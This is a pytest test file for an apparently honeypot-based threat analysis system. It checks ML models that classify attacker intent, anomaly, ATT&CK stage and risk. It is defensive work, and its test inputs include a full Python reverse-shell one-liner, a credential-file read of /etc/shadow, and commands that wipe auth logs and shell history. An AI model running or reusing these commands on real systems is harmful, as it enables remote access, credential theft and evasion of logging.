"""
Automated Verification Suite for all 4 Machine Learning Models in INT-AWARE:
  1. Calibrated Linear SVM: Attacker Intent Classification
  2. Isolation Forest: Honeypot Anomaly & Unknown Behavior Detection
  3. Random Forest: MITRE ATT&CK Intrusion Stage Classification
  4. Gradient Boosting: Threat Risk Score & Severity Prediction
"""

import pytest
from datetime import datetime, timezone
from pathlib import Path

from backend.app.ml.intent_ml_classifier import MLIntentClassifier, ml_intent_classifier
from backend.app.ml.anomaly_detector import CowrieAnomalyDetector, cowrie_anomaly_detector
from backend.app.ml.stage_classifier import StageRandomForestClassifier, stage_random_forest_classifier
from backend.app.ml.risk_predictor import GradientBoostingRiskPredictor, gradient_boosting_risk_predictor
from backend.app.ml.registry import model_registry
from backend.app.models.events import NormalizedEvent
from backend.app.models.features import SessionFeatures
from backend.app.models.intent import IntentCategory, AttackStage
from backend.app.models.risk import RiskSeverity
from backend.app.services.hybrid_classifier import HybridClassifier
from backend.app.services.risk_engine import RiskEngine


def test_model_1_linear_svc_intent_classifier():
    """Verifies Model 1: Calibrated Linear SVM loads and accurately classifies intent."""
    assert ml_intent_classifier.available, f"Model 1 not loaded: {ml_intent_classifier._load_error}"

    # Reconnaissance command
    res1 = ml_intent_classifier.classify("whoami")
    assert res1 is not None
    assert res1.intent == IntentCategory.RECONNAISSANCE
    assert res1.confidence > 0.50
    assert res1.attack_stage == AttackStage.RECONNAISSANCE

    # Credential access command
    res2 = ml_intent_classifier.classify("cat /etc/shadow")
    assert res2 is not None
    assert res2.intent == IntentCategory.CREDENTIAL_ACCESS
    assert res2.confidence > 0.50

    # Cleanup command
    res3 = ml_intent_classifier.classify("history -c")
    assert res3 is not None
    assert res3.intent == IntentCategory.CLEANUP
    assert res3.confidence > 0.50


def test_model_2_isolation_forest_anomaly_detector():
    """Verifies Model 2: Isolation Forest flags anomalies and provides scores."""
    detector = cowrie_anomaly_detector
    assert detector.is_available, "Model 2 (Isolation Forest) is not available"

    # Benign normal commands should have lower anomaly scores
    normal_res = detector.score_command("ls -la")
    assert "anomaly_score" in normal_res
    assert normal_res["source"] == "isolation_forest"

    # Heavily anomalous / obfuscated attack payload
    anom_cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    anom_res = detector.score_command(anom_cmd)
    assert anom_res["anomaly_score"] > normal_res["anomaly_score"]
    assert len(anom_res["factors"]) > 0


def test_model_3_stage_random_forest_classifier():
    """Verifies Model 3: Random Forest maps commands to MITRE ATT&CK intrusion stages."""
    stage_clf = stage_random_forest_classifier
    assert stage_clf.is_available, "Model 3 (Random Forest Stage) is not available"

    # Reconnaissance
    s1 = stage_clf.classify_stage("uname -a")
    assert s1["stage"] == AttackStage.RECONNAISSANCE.value
    assert s1["confidence"] > 0.40

    # Credential Access / Discovery stage
    s2 = stage_clf.classify_stage("cat /etc/shadow")
    assert s2["stage"] == AttackStage.CREDENTIAL_ACCESS.value
    assert s2["confidence"] > 0.40

    # Cleanup
    s3 = stage_clf.classify_stage("history -c")
    assert s3["stage"] == AttackStage.CLEANUP.value


def test_model_4_gradient_boosting_risk_predictor():
    """Verifies Model 4: Gradient Boosting predicts continuous risk scores and severity."""
    predictor = gradient_boosting_risk_predictor
    assert predictor.is_available, "Model 4 (Gradient Boosting Risk) is not available"

    # Low risk benign command
    low_res = predictor.predict_risk(cmd="echo hello", intent="OTHER", failed_logins=0)
    assert low_res["risk_score"] < 40

    # High / Critical risk exploit & privesc command with failed logins
    high_res = predictor.predict_risk(
        cmd="rm -rf /var/log/auth.log && sudo su",
        intent="PRIVILEGE_ESCALATION",
        failed_logins=4,
        session_command_count=10
    )
    assert high_res["risk_score"] > low_res["risk_score"]
    assert len(high_res["contributing_factors"]) >= 2


def test_pipeline_integration_hybrid_classifier_and_risk():
    """Verifies all 4 models seamlessly execute within HybridClassifier and RiskEngine."""
    hybrid = HybridClassifier()

    ev = NormalizedEvent(
        event_id="test_ev_01",
        timestamp=datetime.now(timezone.utc),
        session_id="sess_ml_test",
        event_type="command_input",
        command="cat /etc/shadow"
    )
    sess_feat = SessionFeatures(
        session_id="sess_ml_test",
        total_events=3,
        command_count=2,
        login_failed_count=1,
        duration_seconds=20.0
    )

    # Hybrid classification incorporates Model 1 (Intent), Model 2 (Anomaly), Model 3 (Stage), Model 4 (Risk)
    cls = hybrid.classify(ev, sess_feat)
    assert cls.intent == IntentCategory.CREDENTIAL_ACCESS
    assert cls.anomaly_score is not None
    assert cls.rf_stage is not None
    assert cls.gb_risk_score is not None
    assert cls.gb_severity is not None

    # RiskEngine evaluation preserves deterministic scoring while incorporating ML details
    risk = RiskEngine.evaluate(ev, cls, sess_feat)
    assert risk.risk_score >= 25
    assert "ml_gradient_boosting_score" in risk.calculation_details
    assert "ml_isolation_forest_anomaly_score" in risk.calculation_details
    assert "ml_random_forest_stage" in risk.calculation_details


def test_model_registry_integrity_all_models():
    """Verifies that all 4 models are cataloged with matching cryptographic SHA-256 hashes."""
    models = model_registry.list_models()
    assert len(models) >= 4

    model_ids = {m.model_id for m in models}
    assert "intaware_linear_svc_calibrated_v1" in model_ids
    assert "intaware_isolation_forest_v1" in model_ids
    assert "intaware_stage_random_forest_v1" in model_ids
    assert "intaware_risk_gradient_boosting_v1" in model_ids

    # Cryptographic integrity check
    integrity_results = model_registry.verify_all_artifacts_integrity()
    for m_id, (verified, msg) in integrity_results.items():
        assert verified, f"Integrity failure on {m_id}: {msg}"
